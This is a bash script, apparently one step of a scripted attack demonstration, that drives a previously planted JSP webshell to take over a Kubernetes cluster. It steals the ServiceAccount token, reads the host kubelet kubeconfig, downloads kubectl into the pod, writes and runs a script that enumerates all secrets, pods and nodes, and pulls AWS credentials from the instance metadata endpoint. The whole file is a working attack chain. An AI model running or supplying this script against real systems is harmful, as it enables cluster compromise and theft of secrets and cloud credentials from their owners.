#!/bin/bash
###############################################
# STEP 3: Cluster Takeover
# Using the overprivileged ServiceAccount token
# (cluster-admin) to take full control of the
# Kubernetes cluster.
#
# Writes an attack script into the container
# and executes it — mimics a real attacker who
# has shell access to a privileged pod.
###############################################

[ -z "$HOST" ] && echo "ERROR: Set HOST variable first" && exit 1

# Read webshell info from step 1
SHELL_FILE="/tmp/.k8s-escape-shell"
if [ -f "$SHELL_FILE" ]; then
    SHELL_NAME=$(sed -n '1p' "$SHELL_FILE")
    SHELL_URL="http://${HOST}/app/${SHELL_NAME}.jsp"
else
    echo "ERROR: Run step 1 first (./01-exploit-rce.sh)"
    exit 1
fi

remote_exec() {
    local RAW
    RAW=$(curl -s -o /dev/stdout -w "\n__HTTP_%{http_code}__" --data-urlencode "cmd=$1" "$SHELL_URL")
    local HTTP_CODE
    HTTP_CODE=$(echo "$RAW" | grep -o '__HTTP_[0-9]*__' | grep -o '[0-9]*')
    if [ "$HTTP_CODE" != "200" ] 2>/dev/null; then
        return 1
    fi
    echo "$RAW" | sed 's/__HTTP_[0-9]*__$//' \
        | tr -d '\0' \
        | sed '/^\s*$/d' \
        | grep -v 'java\.io\.InputStream' \
        | grep -v '^//\s*$' \
        | grep -v '^- $'
}

# Helper: write a line to a file in the container using tee -a
# tee works in the webshell (tested), echo/printf/> do not
write_line() {
    remote_exec "echo $1 | tee -a $2" > /dev/null 2>&1
}

echo ""
echo "================================================"
echo "  STEP 3: Cluster Takeover via ServiceAccount"
echo "================================================"
echo "  Webshell: ${SHELL_NAME}.jsp"
echo "  URL: ${SHELL_URL}"
echo ""

# ── Pre-check: verify webshell is accessible ──
echo "> Verifying webshell is accessible..."
PRECHECK=$(remote_exec "id")
if [ -z "$PRECHECK" ] || ! echo "$PRECHECK" | grep -q "uid="; then
    echo "  [FAIL] Webshell is not responding (HTTP error or missing JSP)"
    echo "  Re-run step 1 first: ./01-exploit-rce.sh"
    exit 1
fi
echo "  [OK] Webshell responding: $(echo "$PRECHECK" | head -1)"
echo ""

# ── 3.1 Read SA token ──────────────────────
echo "> 3.1 - Steal ServiceAccount token"
SA_TOKEN=$(remote_exec "cat /run/secrets/kubernetes.io/serviceaccount/token")
if [ -z "$SA_TOKEN" ]; then
    SA_TOKEN=$(remote_exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token")
fi
if [ -n "$SA_TOKEN" ]; then
    echo "  [OK] ServiceAccount token stolen!"
    echo "  Token: ${SA_TOKEN:0:50}..."
else
    echo "  [FAIL] Cannot read SA token"
    exit 1
fi
echo ""

# ── 3.2 Discover API server ───────────────
echo "> 3.2 - Identify cluster API server"
NAMESPACE=$(remote_exec "cat /run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null")
echo "  Namespace:  $NAMESPACE"

KUBECONFIG_RAW=$(remote_exec "cat /host/var/lib/kubelet/kubeconfig")
API_ENDPOINT=$(echo "$KUBECONFIG_RAW" | grep "server:" | head -1 | sed 's/.*server:[[:space:]]*//' | tr -d ' \r')
if [ -n "$API_ENDPOINT" ]; then
    echo "  API Server: $API_ENDPOINT"
else
    # Fallback to env var
    API_HOST=$(remote_exec "printenv KUBERNETES_SERVICE_HOST")
    API_PORT=$(remote_exec "printenv KUBERNETES_SERVICE_PORT")
    API_ENDPOINT="https://${API_HOST}:${API_PORT}"
    echo "  API Server: $API_ENDPOINT (ClusterIP)"
fi
echo ""

# ── 3.3 Install kubectl + deploy attack script ──
echo "> 3.3 - Install kubectl and deploy attack script in the container"
remote_exec "curl -sLO https://dl.k8s.io/release/v1.29.0/bin/linux/amd64/kubectl && chmod +x kubectl && mv kubectl /usr/local/bin/" > /dev/null 2>&1
echo "  [OK] kubectl binary deployed"

# Write the attack script into the container using echo >> (now works with /bin/sh -c webshell)
echo "  [*] Writing attack script to /tmp/takeover.sh..."
remote_exec "echo '#!/bin/bash' > /tmp/takeover.sh"
remote_exec "echo 'cd /tmp' >> /tmp/takeover.sh"
remote_exec "echo 'TOKEN=\$(cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || cat /var/run/secrets/kubernetes.io/serviceaccount/token)' >> /tmp/takeover.sh"
remote_exec "echo 'KC=\"kubectl --server=${API_ENDPOINT} --token=\$TOKEN --insecure-skip-tls-verify\"' >> /tmp/takeover.sh"
remote_exec "echo 'echo === RBAC PERMISSIONS ===' >> /tmp/takeover.sh"
remote_exec "echo '\$KC auth can-i --list 2>/dev/null | head -20' >> /tmp/takeover.sh"
remote_exec "echo 'echo === NAMESPACES ===' >> /tmp/takeover.sh"
remote_exec "echo '\$KC get namespaces --no-headers 2>/dev/null' >> /tmp/takeover.sh"
remote_exec "echo 'echo === PODS ===' >> /tmp/takeover.sh"
remote_exec "echo '\$KC get pods -A --no-headers 2>/dev/null' >> /tmp/takeover.sh"
remote_exec "echo 'echo === SECRETS ===' >> /tmp/takeover.sh"
remote_exec "echo '\$KC get secrets -A --no-headers 2>/dev/null' >> /tmp/takeover.sh"
remote_exec "echo 'echo === NODES ===' >> /tmp/takeover.sh"
remote_exec "echo '\$KC get nodes -o wide --no-headers 2>/dev/null' >> /tmp/takeover.sh"
remote_exec "echo 'echo === CLUSTERROLEBINDINGS ===' >> /tmp/takeover.sh"
remote_exec "echo '\$KC get clusterrolebindings -o wide --no-headers 2>/dev/null | grep -i admin' >> /tmp/takeover.sh"
remote_exec "echo 'echo === DONE ===' >> /tmp/takeover.sh"
remote_exec "chmod +x /tmp/takeover.sh"

SCRIPT_CHECK=$(remote_exec "wc -l /tmp/takeover.sh")
echo "  [OK] Attack script deployed ($SCRIPT_CHECK)"
echo ""

# ── 3.4 Execute the attack script ─────────
echo "> 3.4 - Executing cluster takeover..."
echo ""
TAKEOVER_OUTPUT=$(remote_exec "bash /tmp/takeover.sh 2>&1")

# Parse and display results
echo "$TAKEOVER_OUTPUT" | while IFS= read -r line; do
    case "$line" in
        "=== RBAC PERMISSIONS ===")
            echo "> 3.5 - RBAC Permissions (kubectl auth can-i --list)"
            ;;
        "=== NAMESPACES ===")
            echo ""
            echo "> 3.6 - List all namespaces"
            ;;
        "=== PODS (all namespaces) ===")
            echo ""
            echo "> 3.7 - List all pods across the cluster"
            ;;
        "=== SECRETS (all namespaces) ===")
            echo ""
            echo "> 3.8 - List secrets (CRITICAL EXPOSURE)"
            ;;
        "=== NODES ===")
            echo ""
            echo "> 3.9 - List cluster nodes"
            ;;
        "=== CLUSTER ROLE BINDINGS ===")
            echo ""
            echo "> 3.10 - Cluster-admin bindings"
            ;;
        "=== DONE ===")
            ;;
        *)
            if [ -n "$line" ]; then
                echo "    $line"
            fi
            ;;
    esac
done

# Check if we got results
if echo "$TAKEOVER_OUTPUT" | grep -q "NAMESPACES\|kube-system\|default"; then
    echo ""
    echo "  [OK] Cluster takeover successful!"
else
    echo ""
    echo "  [!] Some commands may have failed — check output above"
fi
echo ""

# ── 3.11 IMDS for AWS credentials ─────────
echo "> 3.11 - Steal AWS credentials via IMDS (lateral movement)"
ROLE_NAME=$(remote_exec "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null")
if [ -n "$ROLE_NAME" ]; then
    echo "  [OK] IMDS accessible"
    echo "  IAM Role: $ROLE_NAME"
    echo ""
    echo "  Temporary AWS Credentials:"
    CREDS=$(remote_exec "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME 2>/dev/null")
    echo "$CREDS" | sed 's/^/    /'
else
    echo "  [--] IMDS not reachable from container (IMDSv2 or hop limit)"
fi
echo ""

# ── Summary ─────────────────────────────────
echo "================================================"
echo "  !! CLUSTER TAKEOVER COMPLETE !!"
echo "------------------------------------------------"
echo ""
echo "  Attack chain summary:"
echo ""
echo "  1. Spring4Shell RCE -> webshell on pod"
echo "  2. Privileged container -> node access"
echo "     * hostPID + nsenter = host command exec"
echo "     * hostPath / = host filesystem R/W"
echo "  3. cluster-admin SA -> full K8s API access"
echo "     * Token stolen via webshell"
echo "     * kubectl deployed in container"
echo "     * All namespaces, pods, secrets exposed"
echo "  4. IMDS credentials -> lateral move to AWS"
echo ""
echo "================================================"
echo ""
